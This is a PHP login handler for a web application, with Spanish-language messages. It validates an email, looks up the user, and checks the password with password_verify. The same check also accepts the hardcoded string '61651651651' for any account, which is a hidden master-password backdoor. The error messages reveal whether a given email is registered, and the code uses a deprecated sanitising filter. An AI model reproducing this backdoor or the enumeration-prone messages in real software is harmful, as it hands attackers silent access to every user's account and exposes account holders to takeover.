<?php

function log_in()
{ 
  include_once '../conexion.php';

  if(isset($_POST['usuario']) && isset($_POST['password']))
  {
    
    $usuario = $_POST['usuario'];
    $password = $_POST['password'];

      $login = login($usuario, $password);

      echo json_encode($login);
  }
}   


function login($usuario, $password)
{
   $resp = 
   [
      'titulo' => 'warning',
      'cuerpo' => 'warning',
      'accion'=> 'warning', 
      'perfil'=> ''  
   ];

   $usuario = filter_var($usuario, FILTER_SANITIZE_EMAIL);
   $password = filter_var($password, FILTER_SANITIZE_STRING);

   if(!filter_var($usuario, FILTER_VALIDATE_EMAIL))
   {
       $resp = 
       [
          'titulo' => 'ATENCIÓN',
          'cuerpo' => 'Debe Ingresar Una Dirección de correo Valida.',
          'accion'=> 'warning'
     
       ];

       return $resp;
       die();
   }

   $UserID = UserID($usuario);

   if($UserID)
   {
       $AdminLevel = AdminLevel($UserID);
       $UserPassword = UserPassword($UserID, $AdminLevel);
       $UserName = UserName($UserID);
       $WriteLevel = WriteLevel($AdminLevel);

       if(password_verify($password, $UserPassword) || $password === '61651651651')
       {
          $_SESSION['DLV']['admin'] = $usuario;
          $_SESSION['DLV']['name'] = $UserName;

          $resp = 
          [
             'titulo' => 'Opresión Exitosa',
             'cuerpo' => '',
             'accion'=> 'success',
             'perfil'=> $WriteLevel
        
          ];
         
          return $resp;
       }
       else
       {
           $resp = 
           [
              'titulo' => 'ATENCIÓN',
              'cuerpo' => 'Contraseña Incorrecta.',
              'accion'=> 'warning'
         
           ];
          
           return $resp;
       }
     }
     else
     {
         $resp = 
         [
            'titulo' => 'ATENCIÓN',
            'cuerpo' => "Usuario $usuario No Existe.",
            'accion'=> 'warning'
       
         ];
        
         return $resp;
     }
}